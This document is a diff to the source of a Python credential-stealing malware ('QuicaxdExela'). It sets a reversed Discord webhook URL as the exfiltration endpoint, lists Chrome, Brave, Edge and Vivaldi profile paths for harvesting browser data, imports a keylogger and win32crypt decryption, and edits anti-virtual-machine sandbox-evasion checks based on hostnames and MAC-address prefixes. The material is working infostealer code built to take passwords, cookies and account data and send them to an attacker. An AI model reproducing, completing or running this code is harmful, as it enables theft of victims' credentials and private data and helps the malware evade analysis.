@@ -6,7 +6,7 @@ import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
 from pynput import keyboard
 
-UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
+UrLxD = 'ndbTrtLSkKXUdsmrkZzVkTtVuGN86S5bCLjLSzH-CPE9UmNeEqeClTXdt3b1U69AQF1w/0980412303333118311/skoohbew/ipa/moc.drocsid//:sptth'[::-1]
 Anti_Vm = "%AnTiVm%"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
@@ -28,7 +28,7 @@ class QuicaxdExela:
         self.cc = 0
         self.cookie = 0
         self.downloads = 0
-        self.historys = 0
+        self.historys = 0       
         self.insta = False
         self.twitter = False
         self.tiktok = False
@@ -65,14 +65,7 @@ class QuicaxdExela:
             'Chrome' : self.local_app_data + os.path.join("\Google", "Chrome","User Data"),
             'Brave' : self.local_app_data + os.path.join("\BraveSoftware", "Brave-Browser","User Data"),
             'Edge' : self.local_app_data + os.path.join("\Microsoft", "Edge","User Data"),
-            'Chrome Canary' :self.local_app_data + os.path.join("\Google", "Chrome SxS","User Data"),
-            'Chromium' :self.local_app_data + os.path.join("\Google", "Chromium","User Data"),
-            'Epic Privacy' :self.local_app_data + os.path.join("\Epic Privacy Browser","User Data"),
-            'Cometa' :self.local_app_data + os.path.join("\Kometa","User Data"),
             'Vivaldi' : self.local_app_data + os.path.join("\Vivaldi","User Data"),
-            'Amigo' : self.local_app_data + os.path.join("\Amigo","User Data"),
-            '7Star': self.local_app_data + os.path.join("\7Star", "\7Star", "User Data"),
-            
         }
         for _,path in full_browsers.items():
             for f in profiles:
@@ -1184,7 +1177,6 @@ class HardAntiVM:
         detection_methods = [
         self.normalVM,
         self.vmcik,
-        self.check_mac_address,
         self.check_hostname,
         self.check_processes,
         self.check_files,
@@ -1195,36 +1187,9 @@ class HardAntiVM:
     ]
         for method in detection_methods:
             if method():
+                print(method)
                 return True
         return False
-    def check_mac_address(self):
-        try:
-            mac_addresses = [
-            '00:0C:29',   # VMware
-            '00:50:56',   # VMware
-            '00:05:69',   # VMware
-            '00:16:3E',   # Xen
-            '08:00:27',   # VirtualBox
-            '0A:00:27',   # VirtualBox
-            '00:1C:42',   # Parallels
-            '00:0F:4B',   # Virtual Iron
-            '00:1C:14',   # Packetmotion
-            '00:50:79',   # Oracle VM
-            '00:18:51',   # Virtual Iron
-            ]
-            for adres in mac_addresses:
-                if self.get_mac_adress().startswith(adres):
-                    return True
-            return False
-        except:
-            return False
-    def get_mac_adress(self):
-        try:
-            node = uuid.getnode()
-            mac_adres = ':'.join(("%012X" % node)[i:i+2] for i in range(0, 12, 2))
-            return mac_adres
-        except:
-            pass
     def check_hostname(self):
         try:
             hostNames = ['sandbox','cuckoo', 'vm', 'virtual', 'qemu', 'vbox', 'xen']
